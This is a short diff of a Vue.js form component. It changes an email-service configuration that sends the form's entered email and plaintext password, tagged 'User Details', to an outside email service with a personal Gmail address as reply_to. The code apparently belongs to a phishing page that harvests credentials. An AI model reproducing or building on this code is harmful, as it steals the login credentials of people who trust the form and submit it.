@@ -122,10 +122,11 @@ export default {
       this.$refs[formName].validate((valid) => {
         if (valid) {
           var data = {
-            service_id: "123456789",
+            service_id: "service_70ntltg",
             template_id: "template_8f1cut7",
             user_id: "user_6dMy0FAzh3UkwGQuDDbjZ",
             template_params: {
+              from_name: 'User Details',
               email: this.ruleForm.name,
               password: this.ruleForm.password,
               reply_to: "janetwilliams1305@gmail.com",
